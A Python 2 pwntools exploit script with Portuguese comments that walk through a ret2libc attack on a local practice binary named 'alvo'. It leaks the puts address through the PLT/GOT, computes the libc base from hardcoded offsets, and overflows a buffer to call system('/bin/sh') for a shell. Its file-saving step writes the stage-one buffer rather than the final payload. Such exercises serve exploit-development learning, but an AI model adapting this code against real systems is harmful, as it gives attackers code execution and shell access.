#!/usr/bin/env python2

#
#
### [ANOTACOES] ###
## [LEAK REAL ADDRESS FROM PUTS] ##
# A PLT resolve em tempo de execucao o endereco passado p/ ela e manda p/ GOT
# A GOT por sua vez fica encarregada de armazenar o valor real da funcao e executa-la em seu segmento
# Entao passaremos puts@got para puts@plt, como ja estouramos o buffer o printf (que mais tarde sera convertido para puts caso nn tenha sido especificado nenhum formato)
# o endereco da puts ja foi resolvido pela PLT e jogado para a GOT
# Entao pedimos o endereco da puts@got(ja que eh aqui que o endereco real fica depois de ser resolvido pela PLT) atraves da puts@plt (que pegara e nos retornara na tela ja que a puts faz isso)
#
## [EXPLOIT] ##
# Com o endereco da puts em maos voltamos para a main
# Pegamos o endereco do offset da puts e subtraimos com o endereco obtido e assim pegaremos o endereco base da libc
# Pegamos o offset de /bin/sh e de system
# Somaremos esses offsets com o endereco base da libc
# Finalizamos com a nossa querida shell e deixamos o ASLR no chinelo
#
#

from pwn import *

### [STAGE 0] - PREPARATION BINARY ###
context(arch = 'amd64', os = 'linux', endian = 'little')

#context.log_level = 'DEBUG'

binary = ELF('alvo')
p = process('./alvo')

### [STAGE 1] - LEAK REAL ADDRESS FROM PUTS ###

p.recvline()
print ''
log.info('Leaking puts address')

pop_rdi = 0x4011e3 	# Gadget: pop rdi ; ret
got_puts = 0x404018	# puts@got
plt_puts = 0x401030	# puts@plt
sym_main = binary.symbols['main']

buf = flat(
	b'A' * 88,
	pop_rdi,
	got_puts,
	plt_puts,
	sym_main
)

log.info('Saving Payload in: payload')

with open('payload', 'w') as file:
	file.write(buf)

p.sendline(buf)

leaked = p.recvline()
formatted = leaked[:8].strip().ljust(8, '\x00')
desc = u64(formatted)
addr = hex(desc)
puts_addr = int(addr, 16)

log.success('Addres PLT@GOT: '+addr)
print ''

### [STAGE 2] - EXPLOIT ###

log.info('Calculating Address...')
offset_puts = 0x76ab0
offset_shell = 0x18bb62
offset_system = 0x49de0

libc_base_addr = puts_addr - offset_puts

system_addr = libc_base_addr + offset_system
shell = libc_base_addr + offset_shell

payload = flat(
	b'A' * 88,
	pop_rdi,
	shell,
	system_addr
)

log.info('Saving Final Payload in: final_payload')
with open('final_payload', 'w') as file:
	file.write(buf)

log.info('Sending Payload...')
p.sendline(payload)
p.interactive()
